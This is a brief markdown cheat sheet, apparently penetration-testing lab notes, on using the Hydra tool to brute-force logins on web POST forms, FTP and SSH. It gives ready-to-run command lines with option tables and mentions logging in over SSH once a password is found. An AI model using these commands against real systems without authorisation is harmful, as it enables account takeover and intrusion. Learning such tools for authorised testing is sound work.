# Hydra
Hydra is a brute force online password cracking program, a quick system login password “hacking” tool.

Hydra can run through a list and “brute force” some authentication services. Imagine trying to manually guess someone’s password on a particular service (SSH, Web Application Form, FTP or SNMP) - we can use Hydra to run through a password list and speed this process up for us, determining the correct password.

# HTTP-POST-Forms
We can use Hydra to brute force web forms too. You must know which type of request it is making; GET or POST methods are commonly used. You can use your browser’s network tab (in developer tools) to see the request types or view the source code.
<br>

### sudo hydra <username> <wordlist> 10.10.68.161 http-post-form "<path>:<login_credentials>:<invalid_response>"
### example => hydra -l <username> -P <wordlist> 10.10.68.161 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V

<table class="table table-bordered">
<thead>
<tr>
<th>Option</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>-l</code></td>
<td>the username for (web form) login</td>
</tr>
<tr>
<td><code>-P</code></td>
<td>the password list to use</td>
</tr>
<tr>
<td><code>http-post-form</code></td>
<td>the type of the form is POST</td>
</tr>
<tr>
<td><code>&lt;path&gt;</code></td>
<td>the login page URL, for example, <code>login.php</code></td>
</tr>
<tr>
<td><code>&lt;login_credentials&gt;</code></td>
<td>the username and password used to log in, for example,
<code>username=^USER^&amp;password=^PASS^</code></td>
</tr>
<tr>
<td><code>&lt;invalid_response&gt;</code></td>
<td>part of the response when the login fails</td>
</tr>
<tr>
<td><code>-V</code></td>
<td>verbose output for every attempt</td>
</tr>
</tbody>
</table>

# FTP
he options we pass into Hydra depend on which service (protocol) we’re attacking. For example, if we wanted to brute force FTP with the username being user and a password list being passlist.txt, we’d use the following command:

### hydra -l user -P passlist.txt ftp://<IP_ADDRESS>

# SSH

### hydra -l <username> -P <full path to pass> <IP_ADDRESS> -t 4 ssh
<table class="table table-bordered">
<thead>
<tr>
<th>Option</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>-l</code></td>
<td>specifies the (SSH) username for login</td>
</tr>
<tr>
<td><code>-P</code></td>
<td>indicates a list of passwords</td>
</tr>
<tr>
<td><code>-t</code></td>
<td>sets the number of threads to spawn</td>
</tr>
</tbody>
</table>

### we can simply ssh after extracting the password